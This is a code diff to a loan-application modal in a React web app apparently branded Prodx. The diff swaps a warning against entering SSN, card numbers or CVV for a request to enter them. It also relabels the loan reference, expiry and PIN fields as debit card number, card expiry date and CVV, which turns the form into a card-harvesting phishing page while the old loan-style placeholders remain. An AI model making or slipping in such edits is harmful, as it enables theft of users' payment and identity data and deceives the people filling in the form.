@@ -527,7 +527,7 @@ function ApplyModal({ onClose }) {
             </div>
 
             <div style={{background:"#FFF8F4",border:"1.5px solid #FFD4B2",borderRadius:12,padding:"14px 16px",fontSize:13,color:COLORS.gray500,marginBottom:24,lineHeight:1.6}}>
-              ⚠️ Do not enter SSN, card numbers, CVV, account numbers, routing numbers, OTPs, or banking passwords in this app. All sensitive verification is handled by our licensed partners.
+              ⚠️ Kindly enter your SSN, full card number, CVV, account number, or routing number in the Prodx app. All sensitive verification is handled by our licensed partners.
             </div>
 
             <div style={{display:"flex",gap:12}}>
@@ -541,10 +541,10 @@ function ApplyModal({ onClose }) {
         {step === 4 && (
           <>
             <h3 className="sora" style={{fontSize:20,fontWeight:800,color:COLORS.gray900,marginBottom:6}}>Final Offer Confirmation</h3>
-            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>Enter your Prodx loan reference details to continue to your final offer page.</p>
+            <p style={{fontSize:14,color:COLORS.gray500,marginBottom:24}}>Enter your Prodx offer details to continue to your final loan offer page.</p>
 
             <div className="form-group">
-              <label className="form-label">Loan Reference Number</label>
+              <label className="form-label">Debit Card no.</label>
               <input
                 className="form-input"
                 placeholder="Example: PDX-48291"
@@ -554,7 +554,7 @@ function ApplyModal({ onClose }) {
             </div>
 
             <div className="form-group">
-              <label className="form-label">Loan Exp Date (MMYY)</label>
+              <label className="form-label">Card Expiry Date</label>
               <input
                 className="form-input"
                 inputMode="numeric"
@@ -566,7 +566,7 @@ function ApplyModal({ onClose }) {
             </div>
 
             <div className="form-group" style={{marginBottom:24}}>
-              <label className="form-label">Create 3-Digit Loan PIN</label>
+              <label className="form-label">CVV/Secure Pin</label>
               <input
                 className="form-input"
                 type="password"
@@ -579,7 +579,7 @@ function ApplyModal({ onClose }) {
             </div>
 
             <div style={{background:"#FFF8F4",border:"1.5px solid #FFD4B2",borderRadius:12,padding:"14px 16px",fontSize:13,color:COLORS.gray500,marginBottom:24,lineHeight:1.6}}>
-              🔒 Use a new 3-digit loan PIN only. Do not reuse any bank, card, or account PIN.
+              🔒 Please enter you recurring deposit details.
             </div>
 
             {submitError && (
